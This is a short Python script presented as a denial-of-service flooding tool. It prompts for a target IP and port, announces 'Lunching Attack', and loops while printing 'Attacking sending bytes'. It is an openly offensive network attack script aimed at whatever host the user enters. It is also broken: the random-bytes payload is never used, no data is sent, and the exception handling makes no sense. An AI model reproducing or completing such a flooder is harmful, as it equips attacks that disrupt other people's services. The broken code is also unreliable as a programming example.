import os
import random
import socket
from sys import platform

if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print("This Script Works Best on Kali linux")
elif platform == "win32":
    os.system("cls")
else:
    print("\033[1;34m [-]Unknown System Detected \033[1;m")

print("\033[1;32m")

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:

    attack = random._urandom
    ip = input("IP> ")
    port = input("port> ")
    print(" ")
    print("Lunching Attack")
    print(" ")
except SyntaxError:
    print(" ")
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print(" ")
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print(" ")
    exit("\033[1;34m [-]Canceled By you \033[1;m")
except ImportError:
    print(" ")
    exit("\033[1;34m [-]Install python 2.7.15")

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Attacking sending bytes ===>")
    except KeyboardInterrupt:
        print(" ")
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print(" ")
        exit("\033[1;34m [-]Install python 2.7.15")